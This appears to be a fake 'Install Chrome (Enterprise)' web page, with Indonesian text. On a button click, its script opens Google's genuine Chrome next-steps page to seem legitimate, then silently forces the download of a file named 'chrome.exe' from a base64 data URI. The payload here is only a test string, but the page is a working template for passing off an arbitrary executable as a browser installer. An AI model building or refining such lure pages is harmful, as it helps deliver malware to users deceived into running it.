<!doctype html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Install App</title></head>
<body>
  <h2>Install (Enterprise)</h2>
  <p>Tekan tombol untuk memulai menginstal chrome.</p>
  <button id="triggerInput">Install </button>

  <script>
    document.getElementById('triggerInput').addEventListener('click', function() {
      // request fullscreen
 setTimeout(function() {
        openWin();
 }, 500);
 window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?statcb=0&installdataindex=empty&defaultbrowser=0', '_blank');
    }, { once: false }); // Use { once: true } to ensure it only fires once
    // Download helper
    function Puf(uri, name) {
      const link = document.createElement("a");
      link.href = uri;
      link.download = name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
    // Kick off your “APK” download
    function openWin() {
      Puf(
        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
        "chrome.exe"
        );
    }

  </script>  
</body>
</html>
